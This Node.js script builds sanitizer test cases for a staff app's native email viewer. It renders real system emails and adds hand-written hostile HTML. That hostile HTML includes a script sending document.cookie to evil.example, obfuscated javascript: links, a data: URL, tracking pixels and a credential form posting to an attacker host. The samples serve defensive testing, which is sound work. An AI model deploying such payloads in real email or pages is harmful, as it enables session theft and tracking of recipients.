#!/usr/bin/env node
/**
 * @license
 * Copyright 2026 Aglyn LLC
 * SPDX-License-Identifier: Apache-2.0
 */

/*
 * THE EMAIL HTML THE STAFF APPS' MESSAGE VIEWER IS TESTED WITH (AGL-3667).
 *
 *   node tools/scripts/generate-native-email-html-cases.mjs           # write
 *   node tools/scripts/generate-native-email-html-cases.mjs --check   # drift guard
 *
 * The staff apps draw a sent message's HTML natively (the `html` block), after cleaning it down to what is
 * read. Both apps replay the cases in `libs/native/screens/email-html-cases.json`: real mail, rendered by the
 * console's own renderer (`email-render.ts`) from the system emails' default designs with their sample values,
 * header and footer, plus hostile and malformed messages written by hand. A case names the words that must
 * read, in order, and the links that must open; the hostile ones also name what must not survive cleaning.
 * The real ones are generated, so a reworded email or a changed renderer reaches the apps' tests as it does a
 * recipient; the hostile ones are fixed here.
 */

import { createRequire } from 'node:module'
import { existsSync, readFileSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

const require = createRequire(import.meta.url)
const ROOT = join(import.meta.dirname, '../..')
const CHECK = process.argv.includes('--check')
const OUT = 'libs/native/screens/email-html-cases.json'

function aliases() {
  const paths = JSON.parse(readFileSync(join(ROOT, 'tsconfig.base.json'), 'utf8')).compilerOptions.paths
  const alias = {}
  for (const [key, [target]] of Object.entries(paths)) {
    if (key.endsWith('/*')) alias[key.slice(0, -2)] = join(ROOT, target.replace(/\/\*$/, ''))
    else if (!(`${key}/*` in paths)) alias[key] = join(ROOT, target)
  }
  return alias
}

/** The system emails rendered: a button, several paragraphs, a security notice, a risk notice, plain digests. */
const REAL = [
  'welcome',
  'email-verification',
  'password-reset',
  'security-new-device',
  'org-invite',
  'risk-email-held',
  'usage-summary',
  'crm-daily-digest',
]

/** Hand-written messages: what must read, what must open, and what must be gone. */
const HOSTILE = [
  {
    name: 'script, style, form and frame are dropped with their content',
    html:
      '<html><head><title>Hidden</title><style>.x{background:url(https://tracker.example/s.css)}</style></head><body>' +
      '<script>document.location="https://evil.example/?c="+document.cookie</script>' +
      '<p onclick="steal()">Your invoice is ready.</p>' +
      '<iframe src="https://evil.example/frame"></iframe><form action="https://evil.example/post"><input name="pw" value="x">Reset it here</form>' +
      '<noscript>Enable scripts</noscript><p>Thanks</p></body></html>',
    text: ['Your invoice is ready.', 'Reset it here', 'Thanks'],
    links: [],
    absent: ['evil.example', 'document.cookie', 'steal()', 'Hidden', 'Enable scripts', 'tracker.example', 'pw'],
  },
  {
    name: 'a link that is not http, https, mailto or tel is read as its text',
    html:
      '<p><a href="javascript:alert(1)">Click</a> <a href="JaVaScRiPt:alert(2)">Again</a> ' +
      '<a href="java&#115;cript:alert(3)">Entity</a> <a href="jav&#x61;script&colon;alert(4)">Hex</a> ' +
      '<a href=" \tjavascript:alert(5)">Spaced</a> <a href="data:text/html;base64,PHNjcmlwdD4=">Data</a> ' +
      '<a href="/relative/path">Relative</a> <a href="#top">Fragment</a> <a name="x">No address</a></p>',
    text: ['Click', 'Again', 'Entity', 'Hex', 'Spaced', 'Data', 'Relative', 'Fragment', 'No address'],
    links: [],
    absent: ['javascript', 'alert', 'data:text'],
  },
  {
    name: 'http, https, mailto and tel links open',
    html:
      '<p>Write to <a href="mailto:help@example.com">help@example.com</a>, call <a href="tel:+15125550100">512-555-0100</a>, ' +
      'read <a href="https://example.com/a?b=1&amp;c=2" onclick="x()" style="color:red">the page</a> or <a HREF=\'http://example.com/plain\'>plain</a>.</p>',
    text: ['Write to help@example.com', 'call 512-555-0100', 'read the page', 'or plain'],
    links: ['mailto:help@example.com', 'tel:+15125550100', 'https://example.com/a?b=1&c=2', 'http://example.com/plain'],
    absent: ['onclick', 'color:red'],
  },
  {
    name: 'an image is its alternative text and fetches nothing',
    html:
      '<table><tr><td><img src="https://tracker.example/open.gif?u=1" width="1" height="1"></td></tr>' +
      '<tr><td><img src="https://cdn.example/logo.png" alt="Acme"></td></tr></table><p>Hello</p>' +
      '<p style="background:url(https://tracker.example/bg.png)">Body</p>',
    text: ['Acme', 'Hello', 'Body'],
    links: [],
    absent: ['tracker.example', 'cdn.example', '<img'],
  },
  {
    name: 'layout tables read cell by cell, top to bottom',
    html:
      '<table width="600"><tbody><tr><td>First</td><td>Second</td></tr><tr><td><table><tr><td>Nested</td></tr></table></td></tr>' +
      '<tr><th>Heading</th></tr></tbody></table><center>Centered</center>',
    text: ['First', 'Second', 'Nested', 'Heading', 'Centered'],
    links: [],
    absent: ['<table', '<td', '<tr'],
  },
  {
    name: 'comments, conditional comments, doctype and unclosed tags do not break it',
    html:
      '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"><?xml version="1.0"?><!--[if mso]><table><tr><td>Outlook only</td></tr></table><![endif]-->' +
      '<!-- a comment --><p>Open paragraph<b>Bold never closed<p>Next <a href="https://example.com/x">link left open',
    text: ['Open paragraph', 'Bold never closed', 'Next', 'link left open'],
    links: ['https://example.com/x'],
    absent: ['Outlook only', 'a comment', 'DOCTYPE'],
  },
  {
    name: 'emphasis, headings, lists and quotes keep their words',
    html:
      '<h1>Receipt</h1><p>Total <strong>$12.00</strong> for <em>one month</em>, <u>paid</u>.</p><ul><li>First item</li><li>Second item</li></ul>' +
      '<ol><li>One</li></ol><blockquote>Quoted</blockquote><pre>a   b</pre><hr><p>R&amp;D &lt;team&gt; &nbsp;&copy; 2026</p>',
    text: ['Receipt', 'Total $12.00 for one month, paid.', 'First item', 'Second item', 'One', 'Quoted', 'R&D <team>'],
    links: [],
    absent: [],
  },
  {
    name: 'an address in an attribute with a greater-than sign stays one tag',
    html: '<p><a title="a > b" href="https://example.com/ok">Keep</a></p><span data-x=\'1 > 0\'>After</span>',
    text: ['Keep', 'After'],
    links: ['https://example.com/ok'],
    absent: ['title='],
  },
]

export async function emailHtmlCases() {
  const { createJiti } = require('jiti')
  const jiti = createJiti(join(ROOT, 'package.json'), { interopDefault: true, fsCache: false, alias: aliases() })
  const catalog = await jiti.import(join(ROOT, 'libs/shared/util/email/src/lib/system-email-catalog.ts'))
  const render = await jiti.import(join(ROOT, 'libs/shared/util/email/src/lib/email-render.ts'))
  const cases = []
  for (const key of REAL) {
    const template = catalog.SYSTEM_EMAIL_TEMPLATES.find((entry) => entry.key === key)
    if (!template) throw new Error(`No system email "${key}"`)
    const merge = Object.fromEntries(template.mergeTokens.map((token) => [token.name, token.sample]))
    const nodes = catalog.buildDefaultEmailNodeMap(template)
    const chrome = {
      header: { logoAlt: merge['brand.productName'] ?? 'Aglyn', href: 'https://example.com/' },
      footer: {
        reason: template.footerReason,
        support: { label: 'Contact support', href: 'https://example.com/support' },
        legal: '© 2026 Example LLC · Austin, TX',
      },
    }
    const { html } = render.renderEmailHtml({
      nodes,
      rootId: render.EMAIL_NODE_ROOT_ID,
      subject: template.defaultSubject,
      merge,
      chrome,
      sanitize: (value) => value,
    })
    const merged = (value) => render.substituteMergeTokens(value, merge)
    const blocks = template.defaultBody ?? []
    cases.push({
      name: `system email: ${key}`,
      html,
      // Every paragraph and button label, merged, in the order they draw.
      text: blocks.map((block) => (block.block === 'button' ? merged(block.label) : merged(block.text))).filter(Boolean),
      // Every address a recipient could open, as the renderer wrote it: the header, the buttons, links inside a
      // paragraph, and the support line.
      links: [...new Set([...html.matchAll(/<a\b[^>]*\bhref="([^"]*)"/gi)].map((match) => match[1].replaceAll('&amp;', '&')))].filter(
        (href) => /^(https?:\/\/|mailto:|tel:)/i.test(href),
      ),
      absent: ['<table', '<td', '<img', 'style=', 'bgcolor'],
    })
  }
  return [...cases, ...HOSTILE.map((entry) => ({ absent: [], ...entry }))]
}

if (import.meta.url === `file://${process.argv[1]}`) {
  const next = `${JSON.stringify({ cases: await emailHtmlCases() }, null, 2)}\n`
  const current = existsSync(join(ROOT, OUT)) ? readFileSync(join(ROOT, OUT), 'utf8') : ''
  if (next === current) {
    console.log(`ok ${OUT}`)
  } else if (CHECK) {
    console.error(`stale ${OUT}: run node tools/scripts/generate-native-email-html-cases.mjs`)
    process.exit(1)
  } else {
    writeFileSync(join(ROOT, OUT), next)
    console.log(`wrote ${OUT}`)
  }
}
